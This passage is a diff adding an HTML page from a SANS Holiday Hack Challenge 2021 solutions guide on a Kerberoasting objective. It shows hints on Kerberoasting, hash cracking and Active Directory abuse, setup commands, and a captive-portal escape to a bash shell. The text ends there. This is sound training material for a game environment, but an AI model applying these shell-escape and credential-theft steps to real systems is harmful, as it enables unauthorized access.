@@ -1,0 +1,1240 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="Paul DeCamp (KringleCon Attendee: Nutmeg)">
+      
+      
+        <link rel="canonical" href="https://pdecamp.github.io/HHC2021-Solutions-Guide/objectives/O8_Kerberoasting_on_an_Open_Fire/">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.3">
+    
+    
+      
+        <title>8) Kerberoasting on an Open Fire - 2021 SANS Holiday Hack Challenge Solutions Guide</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.edf004c2.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#4cae4f">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="red">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#objective-8-kerberoasting-on-an-open-fire" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="2021 SANS Holiday Hack Challenge Solutions Guide" class="md-header__button md-logo" aria-label="2021 SANS Holiday Hack Challenge Solutions Guide" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            2021 SANS Holiday Hack Challenge Solutions Guide
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              8) Kerberoasting on an Open Fire
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="2021 SANS Holiday Hack Challenge Solutions Guide" class="md-nav__button md-logo" aria-label="2021 SANS Holiday Hack Challenge Solutions Guide" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    2021 SANS Holiday Hack Challenge Solutions Guide
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Welcome
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Objectives
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Objectives" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Objectives
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O1_KringleCon_Orientation/" class="md-nav__link">
+        1) KringleCon Orientation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O2_Where_in_the_World_is_Caramel_Santaigo/" class="md-nav__link">
+        2) Where in the World is Caramel Santaigo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O3_Thaw_Frost_Towers_Entrance/" class="md-nav__link">
+        3) Thaw Frost Tower's Entrance
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O4_Slot_Machine_Investigation/" class="md-nav__link">
+        4) Slot Machine Investigation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O5_Strange_USB_Device/" class="md-nav__link">
+        5) Strange USB Device
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O6_Shellcode_Primer/" class="md-nav__link">
+        6) Shellcode Primer
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O7_Printer_Exploitation/" class="md-nav__link">
+        7) Printer Exploitation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          8) Kerberoasting on an Open Fire
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        8) Kerberoasting on an Open Fire
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#hints-and-resources" class="md-nav__link">
+    Hints and Resources
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    Setup
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-0-register-at-the-elfu-portal-and-connect" class="md-nav__link">
+    Step 0: Register at the ElfU Portal and Connect
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-1-shell-escape" class="md-nav__link">
+    Step 1: Shell Escape
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-investigate-the-network" class="md-nav__link">
+    Step 2: Investigate the Network
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-steal-a-hash" class="md-nav__link">
+    Step 3: Steal a Hash
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-crack-the-hash" class="md-nav__link">
+    Step 4: Crack the Hash
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-investigate-the-elfu_svc_shr-file-share" class="md-nav__link">
+    Step 5: Investigate the elfu_svc_shr File Share
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6-get-access-to-the-research_dep-share" class="md-nav__link">
+    Step 6: Get Access to the research_dep Share
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-7-retrieve-the-file-from-the-research_dep-share" class="md-nav__link">
+    Step 7: Retrieve the file from the research_dep share
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#completion" class="md-nav__link">
+    Completion
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O9_Splunk/" class="md-nav__link">
+        9) Splunk!
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O10_Now_Hiring/" class="md-nav__link">
+        10) Now Hiring!
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O11_Customer_Complaint_Analysis/" class="md-nav__link">
+        11) Customer Complaint Analysis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O12_Frost_Tower_Website_Checkup/" class="md-nav__link">
+        12) Frost Tower Website Checkup
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O13_FPGA_Programming/" class="md-nav__link">
+        13) FPGA Programming
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Terminal Challenges
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Terminal Challenges" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Terminal Challenges
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T2_Document_Analysis/" class="md-nav__link">
+        Pinny Sappington - Document Analysis / Exif Metadata
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T3_Grepping_for_Gold/" class="md-nav__link">
+        Greasy Gopherkins - Grepping for Gold
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T4_Logic_Munchers/" class="md-nav__link">
+        Noel Boetie - Logic Munchers
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T5_IPv6_Sandbox/" class="md-nav__link">
+        Jewel Loggins - IPv6 Sandbox
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T6_Holiday_Hero/" class="md-nav__link">
+        Chimney Scissorsticks - Holiday Hero
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T8_HoHo_No/" class="md-nav__link">
+        Eve Snowshoes - HoHo No
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T9_Yara_Analysis/" class="md-nav__link">
+        Fitzy Shortstack - Yara Analysis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T10_IMDS_Exploration/" class="md-nav__link">
+        Noxious ODor - IMDS Exploration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T11_Strace_Ltrace_Retrace/" class="md-nav__link">
+        Tinsel Upatree - Strace, Ltrace, Retrace
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T12_Elf_Code_Python/" class="md-nav__link">
+        Rib Bonbowford - Elf Code Python
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T13_Frostavator/" class="md-nav__link">
+        Grody Toiterson - Frostavator
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          Extras
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Extras" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Extras
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../extras/O2_Where_in_the_World_is_Caramel_Santaigo/" class="md-nav__link">
+        Extra Content for Where in the World is Caramel Santaigo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../extras/T4_Logic_Munchers/" class="md-nav__link">
+        Extra Content for Logic Munchers
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../extras/O11_Customer_Complaint_Analysis/" class="md-nav__link">
+        Extra Content for Customer Complaint Analysis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../extras/O12_Frost_Tower_Website_Checkup/" class="md-nav__link">
+        Extra Content for Frost Tower Website Checkup
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#hints-and-resources" class="md-nav__link">
+    Hints and Resources
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    Setup
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-0-register-at-the-elfu-portal-and-connect" class="md-nav__link">
+    Step 0: Register at the ElfU Portal and Connect
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-1-shell-escape" class="md-nav__link">
+    Step 1: Shell Escape
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-investigate-the-network" class="md-nav__link">
+    Step 2: Investigate the Network
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-steal-a-hash" class="md-nav__link">
+    Step 3: Steal a Hash
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-crack-the-hash" class="md-nav__link">
+    Step 4: Crack the Hash
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-investigate-the-elfu_svc_shr-file-share" class="md-nav__link">
+    Step 5: Investigate the elfu_svc_shr File Share
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6-get-access-to-the-research_dep-share" class="md-nav__link">
+    Step 6: Get Access to the research_dep Share
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-7-retrieve-the-file-from-the-research_dep-share" class="md-nav__link">
+    Step 7: Retrieve the file from the research_dep share
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#completion" class="md-nav__link">
+    Completion
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+<h1 id="objective-8-kerberoasting-on-an-open-fire">Objective 8) Kerberoasting on an Open Fire</h1>
+<div class="admonition summary">
+<p class="admonition-title"><em>Difficulty</em>: <span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span><span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span><span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span><span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span><span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span></p>
+<p>Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the <a href="https://register.elfu.org/">ElfU Portal</a>. Find Eve Snowshoes in Santa's office for hints.</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>When I played through this objective did not unlock until the <a href="../../challenges/T8_HoHo_No">HoHo ... No</a> Terminal Challenge was completed.</p>
+</div>
+<h2 id="hints-and-resources">Hints and Resources</h2>
+<details class="hint">
+<summary>Hints provided after helping Eve Snowshoes and completing the <a href="../../challenges/T8_HoHo_No">HoHo ... No</a> Terminal Challenge</summary>
+<p><strong>Kerberoast and AD Abuse Talk</strong><br>
+Check out <a href="https://www.youtube.com/watch?v=iMh8FTzepU4">Chris Davis' talk</a> <a href="https://github.com/chrisjd20/hhc21_powershell_snippets">and scripts</a> on Kerberoasting and Active Directory permissions abuse.</p>
+<p><strong>Kerberoasting and Hashcat Syntax</strong><br>
+Learn about <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">Kerberoasting</a> to leverage domain credentials to get usernames and crackable hashes for service accounts.</p>
+<p><strong>Hashcat Mangling Rules</strong><br>
+<a href="https://github.com/NotSoSecure/password_cracking_rules">OneRuleToRuleThemAll.rule</a> is great for mangling when a password dictionary isn't enough.<br></p>
+<p><strong>Finding Domain Controllers</strong><br>
+There will be some <code>10.X.X.X</code> networks in your routing tables that may be interesting. Also, consider adding <code>-PS22,445</code> to your <code>nmap</code> scans to "fix" default probing for unprivileged scans.<br></p>
+<p><strong>CeWL for Wordlist Creation</strong><br>
+<a href="https://github.com/digininja/CeWL">CeWL</a> can generate some great wordlists from website, but it will ignore digits in terms by default.<br></p>
+<p><strong>Stored Credentials</strong><br>
+Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes!<br></p>
+<p><strong>Active Directory Interrogation</strong><br>
+Investigating Active Directory errors is harder without <a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a>, but there are <a href="https://social.technet.microsoft.com/Forums/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell">native</a> <a href="https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf">methods</a>.<br></p>
+</details>
+<details class="hint">
+<summary>Other Resources</summary>
+<p><strong>Hashcat</strong><br>
+<a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p>
+<p><strong>GetUserSPNs Python script from SecureAuthCorp</strong><br>
+<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py</a></p>
+<p><strong>Some of my scripts and files referenced in the guide</strong><br>
+<a href="https://github.com/pdecamp/HHC2021-Solutions-Guide/tree/main/Objective8">https://github.com/pdecamp/HHC2021-Solutions-Guide/tree/main/Objective8</a></p>
+</details>
+<h2 id="setup">Setup</h2>
+<p>For this challenge I used Hashcat and CeWL on Linux as well as the OneRuleToRuleThemAll password cracking rule file.</p>
+<div class="highlight"><span class="filename">Local System</span><pre><span></span><code>sudo apt install hashcat cewl
+wget https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
+</code></pre></div>
+<h2 id="solution">Solution</h2>
+<h3 id="step-0-register-at-the-elfu-portal-and-connect">Step 0: Register at the ElfU Portal and Connect</h3>
+<p>Open the <a href="https://register.elfu.org/">ElfU Portal</a> and register an account.  Note that information entered here will not be used during the challenge, so it can be your real information.  After registering you will get a username and password to use for the challenge (be sure to save these and note that all accounts are reset at midnight).</p>
+<h3 id="step-1-shell-escape">Step 1: Shell Escape</h3>
+<p>After registering, connect to the ElfU portal<br>
+<code>ssh &lt;username&gt;@grades.elfu.org -p 2222</code></p>
+<p>When we first connect we are presented with a captive portal where we can only view our grades and exit.</p>
+<p>To escape this portal enter <span class="keys"><kbd class="key-control">Ctrl</kbd><span>+</span><kbd class="key-d">D</kbd></span>, which sends the EOF character to the running script and causes it to crash.  We will now be at an interactive Python prompt where we can type <code>os.system("/bin/bash")</code> to start a new bash shell.</p>
+<p>Once we've done that, we can change our default shell to /bin/bash so a) we don't need to re-escape the Grades Portal if we have to log in again, and b) <code>scp</code>, which we will use to transfer files to and from the ElfU system will work.</p>
+<details class="info">
